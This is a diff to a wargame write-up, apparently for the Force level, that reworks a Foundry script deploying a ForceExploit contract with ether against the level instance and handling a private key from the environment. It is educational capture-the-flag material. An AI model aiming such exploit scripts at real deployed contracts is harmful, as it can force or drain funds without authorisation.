@@ -141,12 +141,13 @@ contract ForceTest is Test {
 ```solidity
 contract Exploit is Script {
 
-        address hacker = vm.envAddress("PRIVATE_KEY");  
-        address payable instance = payable(vm.envAddress("INSTANCE_LEVEL7"));       
+        address payable instance = payable(vm.envAddress("INSTANCE_LEVEL7"));   
+        uint256 hacker = vm.envUint("PRIVATE_KEY");   
+        address deployer = vm.rememberKey(hacker);    
         
         function run() external {
 
-            vm.startBroadcast(hacker);
+            vm.startBroadcast(deployer);
             ForceExploit exploit = new ForceExploit{value: 0.0005 ether}(instance);
             vm.stopBroadcast();
     }
@@ -168,7 +169,7 @@ contract Exploit is Script {
 
 ---
 
-### solution using `cast`
+### alternative solution using `cast`
 
 <br>
 
